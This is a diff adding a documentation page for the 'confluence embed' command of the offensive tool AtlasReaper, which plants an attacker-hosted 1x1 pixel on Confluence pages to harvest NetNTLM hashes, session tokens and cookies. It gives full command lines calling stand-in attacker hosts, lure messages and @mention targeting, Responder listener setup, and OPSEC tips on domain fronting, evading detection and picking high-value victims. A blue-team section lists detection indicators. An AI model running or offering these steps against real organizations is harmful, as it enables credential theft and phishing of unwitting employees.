@@ -1,0 +1,284 @@
+---
+title: 'embed'
+description: 'Embed a 1x1 pixel image for credential farming and authentication harvesting'
+icon: 'image'
+---
+
+## Overview
+
+The `confluence embed` command embeds a 1x1 pixel image hosted on an attacker-controlled server into a Confluence page. This technique is used for credential farming attacks, where the target's browser or application will make an authenticated request to the attacker's server when viewing the page, potentially leaking authentication tokens, session cookies, or NetNTLM hashes.
+
+This is one of AtlasReaper's most powerful offensive features for harvesting credentials without requiring the target to download or execute anything.
+
+## Syntax
+
+```bash
+.\AtlasReaper.exe confluence embed [options]
+```
+
+## Required Parameters
+
+<ParamField path="--url" type="string" required>
+  The base URL of the Confluence instance (e.g., `https://example.atlassian.net`)
+</ParamField>
+
+<ParamField path="--page" type="string" required>
+  The page ID where the 1x1 pixel image will be embedded. Page IDs can be discovered using the `confluence listpages` command
+</ParamField>
+
+<ParamField path="--link" type="string" required>
+  URL to your listener/attacker server that will host the 1x1 pixel image (e.g., `http://attacker.com/pixel.png` or `file://attacker.com/share/image.png`)
+</ParamField>
+
+## Optional Parameters
+
+<ParamField path="--cookie" type="string">
+  Authentication cookie (`cloud.session.token` or `tenant.session.token`). If omitted, the command will attempt anonymous access (if enabled on the target)
+</ParamField>
+
+<ParamField path="--message" type="string">
+  Context message to add to the page (e.g., "I need you to take a look at this"). This increases the likelihood the target will view the page
+</ParamField>
+
+<ParamField path="--at" type="string">
+  User ID to mention (@) on the page, generating a notification to increase engagement. User IDs can be obtained using the `jira listusers` command
+</ParamField>
+
+<ParamField path="--output" type="string">
+  Save command output to a specified file
+</ParamField>
+
+## Examples
+
+<Tabs>
+  <Tab title="Basic Pixel Embedding">
+    ```bash
+    .\AtlasReaper.exe confluence embed \
+      --page "12345" \
+      --link "http://attacker.example.com/pixel.png" \
+      --url https://target.atlassian.net \
+      --cookie "cloud.session.token=abc123..."
+    ```
+    Embeds a 1x1 pixel image that will capture HTTP requests when the page is viewed.
+  </Tab>
+
+  <Tab title="With Social Engineering">
+    ```bash
+    .\AtlasReaper.exe confluence embed \
+      --page "12345" \
+      --link "http://attacker.example.com/tracking.gif" \
+      --message "Hi team, I've updated the project status. Please review and provide feedback." \
+      --at "557058:f1234567-89ab-cdef-0123-456789abcdef" \
+      --url https://target.atlassian.net \
+      --cookie "cloud.session.token=abc123..."
+    ```
+    Embeds a pixel with a convincing message and mentions a specific user to ensure they view the page.
+  </Tab>
+
+  <Tab title="NetNTLM Hash Capture">
+    ```bash
+    .\AtlasReaper.exe confluence embed \
+      --page "67890" \
+      --link "file://attacker-server.com/share/image.png" \
+      --message "Please check the updated network diagram" \
+      --url https://target.atlassian.net \
+      --cookie "cloud.session.token=abc123..."
+    ```
+    Uses a UNC path to capture NetNTLM hashes via SMB authentication when Windows users view the page.
+  </Tab>
+
+  <Tab title="Multiple Target Campaign">
+    ```bash
+    .\AtlasReaper.exe confluence embed \
+      --page "12345" \
+      --link "http://attacker.example.com/pixel.php?campaign=confluence_team" \
+      --message "Action required: Please review the security policy updates" \
+      --url https://target.atlassian.net \
+      --cookie "cloud.session.token=abc123..."
+    ```
+    Embeds a pixel with campaign tracking parameters to identify which page/campaign generated each captured credential.
+  </Tab>
+</Tabs>
+
+## Use Cases
+
+<AccordionGroup>
+  <Accordion title="Red Team Perspectives" icon="user-secret">
+    **Credential Harvesting**
+    - Capture NetNTLM hashes when Windows users view the page (using file:// UNC paths)
+    - Harvest authentication tokens sent in HTTP requests to attacker infrastructure
+    - Collect session cookies if users' browsers send them with the image request
+    - Capture authorization headers from automated systems or bots that parse Confluence pages
+
+    **Reconnaissance and Targeting**
+    - Identify active users by tracking who views specific pages
+    - Collect user agent strings to identify client software and versions
+    - Gather IP addresses to map internal network ranges
+    - Determine organizational work patterns (when pages are viewed)
+
+    **Phishing Amplification**
+    - Embed pixels in high-traffic pages to maximize harvest
+    - Use @mentions to ensure specific high-value targets view the page
+    - Combine with social engineering messages to increase view likelihood
+    - Target pages that specific job roles or teams must access regularly
+
+    **Persistence and Monitoring**
+    - Track when compromised accounts are accessed or investigated
+    - Monitor administrative access to sensitive pages
+    - Detect when incident response teams are reviewing your activities
+    - Maintain awareness of which users are active in the environment
+  </Accordion>
+
+  <Accordion title="Blue Team Perspectives" icon="shield-halved">
+    **Threat Detection Indicators**
+    - Embedded images pointing to external domains (not approved content delivery networks)
+    - UNC file:// paths embedded in Confluence pages
+    - Unexpected 1x1 pixel images with no legitimate business purpose
+    - External image loads from unusual or newly registered domains
+    - Pages modified to include external content by compromised accounts
+
+    **Hunting Opportunities**
+    - Search Confluence page content for "img src" tags pointing to external URLs
+    - Review audit logs for page modifications that add external media
+    - Monitor web proxy logs for requests to suspicious domains from Confluence users
+    - Identify patterns of external image requests correlated with page views
+    - Look for authentication failures or hash capture attempts in security logs
+
+    **Security Controls**
+    - Disable external image loading in Confluence (Content Security Policy)
+    - Implement web proxy filtering to block requests to unknown external domains
+    - Enable SMB signing and disable NetNTLM authentication where possible
+    - Configure alerts for embedded UNC paths in collaboration platforms
+    - Require approval for embedding external content in Confluence pages
+    - Monitor outbound authentication attempts to external hosts
+
+    **Incident Response**
+    - Identify all users who viewed the page containing the malicious embed
+    - Determine if any credentials were harvested (check authentication logs)
+    - Review the page edit history to identify when the embed was added
+    - Assess the privileges of users who viewed the page
+    - Reset credentials for affected users if hash capture is suspected
+    - Remove the embedded content and restore the page to previous version
+  </Accordion>
+</AccordionGroup>
+
+## Output
+
+The command returns information about the embed operation:
+
+- Confirmation that the embed was successful
+- Page ID where the image was embedded
+- The URL of the embedded image
+- Any errors or warnings encountered
+
+Example output structure:
+```
+[+] Successfully embedded image on page
+    Page ID: 12345
+    Image URL: http://attacker.example.com/pixel.png
+    Message: Hi team, I've updated the project status.
+    User mentioned: @john.doe
+```
+
+On the attacker's server, you'll need to set up a web server or Responder to capture the incoming requests:
+
+```bash
+# HTTP listener example
+python3 -m http.server 80
+
+# Responder for NetNTLM hash capture
+sudo responder -I eth0 -wrf
+```
+
+## Detection Considerations
+
+<Warning>
+  This technique can be detected through multiple security mechanisms:
+</Warning>
+
+**Confluence Audit Logs**
+- Page edit events will show the compromised account modifying pages
+- Audit logs include timestamp, username, page ID, and change type
+- Embedding external content may generate specific audit events
+
+**Content Security Policy (CSP)**
+- Organizations with strict CSP may block external image loading
+- Browser console will show CSP violations if configured
+- Modern Confluence instances may have default CSP that prevents this attack
+
+**Web Proxy and Firewall Logs**
+- Outbound requests to attacker infrastructure will be logged
+- Web filters may block access to unknown or malicious domains
+- Network monitoring may alert on unusual outbound connections
+
+**Email Notifications**
+- Users mentioned with @username will receive email notifications
+- Notification emails may be reviewed by security teams during investigations
+- High-value targets may report suspicious mentions
+
+**Network Traffic Analysis**
+- Authentication attempts to external hosts may trigger IDS/IPS alerts
+- NetNTLM hash capture attempts are detectable by endpoint security solutions
+- Unusual SMB traffic to external hosts is a strong indicator of compromise
+
+## OPSEC Considerations
+
+<Tip>
+  Maximize operational security with these best practices:
+</Tip>
+
+1. **Infrastructure Setup**
+   - Use domains that blend with the target environment (avoid obviously malicious names)
+   - Consider using legitimate cloud services (AWS, Azure) to host your listener
+   - Implement HTTPS on your listener to reduce suspicion
+   - Use domain fronting or CDN services to obscure the true destination
+
+2. **Payload Hosting**
+   - Actually host a 1x1 pixel image to avoid 404 errors that may be logged
+   - Configure your web server to log all incoming requests with full headers
+   - Set up automated credential capture and notification systems
+   - Consider using unique URLs per target to track which user accessed the page
+
+3. **Social Engineering Quality**
+   - Craft messages that match organizational communication style
+   - Reference real projects or initiatives to increase legitimacy
+   - Choose appropriate pages where the message context makes sense
+   - Time the operation during normal business hours for the target user
+
+4. **Target Selection**
+   - Focus on high-value users (admins, developers, executives)
+   - Choose pages that targets are likely to view regularly
+   - Consider using team/project pages rather than personal spaces
+   - Be selective with @mentions to avoid mass notifications
+
+5. **Timing Considerations**
+   - Perform the embed operation during business hours
+   - Consider time zones and typical work schedules
+   - Space out operations if targeting multiple pages
+   - Be prepared to capture credentials quickly (users may only view once)
+
+6. **Cleanup and Attribution**
+   - Be aware that page history will show the edit
+   - Consider removing the embed after successful credential capture
+   - Remember that even deleted content may be recoverable
+   - The compromised account username will be attributed to the action
+
+7. **Technical Constraints**
+   - Test whether the target Confluence instance allows external image loading
+   - Verify that network egress filtering doesn't block your listener
+   - For NetNTLM capture, ensure SMB traffic can reach your server
+   - Be aware of potential CSP policies that may block the technique
+
+8. **Legal and Ethical**
+   - Ensure proper authorization for credential harvesting operations
+   - This technique actively harvests authentication material
+   - Document scope and approval for offensive operations
+   - Consider the ethical implications of credential harvesting
+
+## Related Commands
+
+- [confluence link](/confluence/link) - Alternative method using hyperlinks instead of embedded images
+- [confluence attach](/confluence/attach) - Attach malicious files that may also harvest credentials when opened
+- [confluence listpages](/confluence/listpages) - Identify high-value pages for embedding operations
+- [jira listusers](/jira/listusers) - Obtain user IDs for targeted @mentions
+- [confluence search](/confluence/search) - Find pages with specific content or high visibility
